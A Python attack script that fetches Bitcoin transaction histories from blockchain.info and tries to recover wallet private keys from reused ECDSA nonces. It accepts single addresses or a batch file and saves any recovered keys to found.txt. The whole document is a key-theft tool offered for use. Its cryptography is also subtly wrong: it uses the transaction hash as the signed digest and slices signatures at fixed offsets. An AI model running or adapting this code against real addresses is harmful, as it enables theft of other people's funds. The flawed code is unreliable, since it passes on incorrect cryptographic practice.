import requests
import json
import time
from fastecdsa.curve import secp256k1

def fetch_all_transactions(address):
    url = f"https://blockchain.info/rawaddr/{address}?limit=100"
    transactions = []
    offset = 0

    while True:
        try:
            response = requests.get(f"{url}&offset={offset}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                transactions.extend(data["txs"])
                
                print(f"✅ Fetched {len(transactions)} Transactions...")
                
                if len(data["txs"]) < 100:
                    break  # No more transactions left to fetch
                offset += 100
            else:
                print("❌ API Error, Retrying in 2 sec...")
                time.sleep(2)
        except Exception as e:
            print(f"❌ Error: {e} | Retrying in 2 sec...")
            time.sleep(2)

    return transactions

def extract_rsz(transaction):
    try:
        for inp in transaction["inputs"]:
            if "script" in inp and len(inp["script"]) > 130:
                sig = inp["script"][-130:]
                r, s = int(sig[:64], 16), int(sig[64:], 16)
                z = int(transaction["hash"], 16)
                pub_key = inp["script"][len(sig)-130:len(sig)-2]
                
                print(f"\n📌 Transaction ID: {transaction['hash']}")
                print(f"🔹 Public Key: {pub_key}")
                print(f"🔹 r: {hex(r)}")
                print(f"🔹 s: {hex(s)}")
                print(f"🔹 z: {hex(z)}")
                
                return r, s, z, pub_key
    except:
        pass
    return None, None, None, None

def calculate_private_key(pair1, pair2):
    r1, s1, z1, pub1 = pair1
    r2, s2, z2, pub2 = pair2

    if r1 == r2 and s1 != s2:
        try:
            k = ((z1 - z2) * pow(s1 - s2, -1, secp256k1.q)) % secp256k1.q
            private_key = ((s1 * k - z1) * pow(r1, -1, secp256k1.q)) % secp256k1.q
            
            print(f"\n✅ Vulnerability Found in Transactions!")
            print(f"🔹 Transaction 1: {hex(z1)}")
            print(f"🔹 Transaction 2: {hex(z2)}")
            print(f"🔹 k Value Reused: {hex(k)}")
            print(f"🔹 Extracted Private Key: {hex(private_key)}\n")
            
            return private_key
        except:
            return None
    return None

def process_address(address):
    print(f"\n🔍 Checking Address: {address}")
    transactions = fetch_all_transactions(address)
    print(f"✅ Total Transactions: {len(transactions)}")

    rsz_data = []
    for tx in transactions:
        r, s, z, pub_key = extract_rsz(tx)
        if r and s:
            rsz_data.append((r, s, z, pub_key))

    print("\n🔎 Analyzing Transactions for Vulnerabilities...")
    for i in range(len(rsz_data)):
        for j in range(i+1, len(rsz_data)):
            private_key = calculate_private_key(rsz_data[i], rsz_data[j])
            if private_key:
                with open("found.txt", "a") as f:
                    f.write(f"{hex(private_key)}\n")
                return  

    print("❌ No vulnerability found!")

if __name__ == "__main__":
    print("\n🔹 CRYPTOGRAPHYTUBE Multi-Nonce Delta Offset Attack 🔹\n")
    choice = input("Enter (1) for Single Address or (2) for BTC.txt: ")

    if choice == "1":
        address = input("Enter Bitcoin Address: ").strip()
        process_address(address)
    elif choice == "2":
        with open("btc.txt", "r") as file:
            addresses = file.readlines()
        for address in addresses:
            process_address(address.strip())
